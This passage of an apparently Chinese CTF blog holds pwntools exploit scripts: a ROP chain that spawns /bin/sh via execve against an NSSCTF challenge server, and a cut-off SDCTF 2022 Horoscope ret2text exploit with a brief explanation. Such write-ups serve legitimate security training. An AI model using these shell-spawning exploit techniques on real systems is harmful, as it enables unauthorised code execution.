class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from struct import pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28947)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(-10000))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(4))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(str(5))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040a67e) # pop rsi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e0) # @ .data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000458827) # pop rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += b&amp;#x27;/bin//sh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040a67e) # pop rsi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e8) # @ .data + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000447339) # xor rax, rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040264f) # pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e0) # @ .data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x000000000040a67e) # pop rsi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e8) # @ .data + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x00000000004e60e8) # @ .data + 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x4141414141414141) # padding&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000447339) # xor rax, rax ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000496710) # add rax, 1 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p += pack(&amp;#x27;&amp;lt;Q&amp;#x27;, 0x0000000000402404) # syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;sdctf-2022horoscope&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sdctf-2022horoscope&#34;&gt;#&lt;/a&gt; [SDCTF 2022]Horoscope&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;利用这个 atoi 去是 a1 等于 1 这个 s 的话是需要使用 0x38 才能溢出，那么的话利用使一个 b&#39;a&#39;*0x38 等于 b&#39;1&#39;+b&#39;a&#39;*0x38 因为 atoi 只会转换数字为整数，所以我们可以利用这个点去得到让这个程序完整运行，然后就是一个简单的 ret2text 了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28120)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=process(&amp;#x27;./horoscope&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;horoscope&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload=b&amp;#x27;1&amp;#x27;+b&amp;#x27;a&amp;#x27;*(0x30+0x7)+p64(elf.sym[&amp;#x27;debug&amp;#x27;])+p64(elf.sym[&amp;#x27;test&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;1&amp;#x27;+b&amp;#x27;a&amp;#x27;*(0x37)+p64(0x40095F)&lt;/span&gt;&lt;br&gt;&lt;span 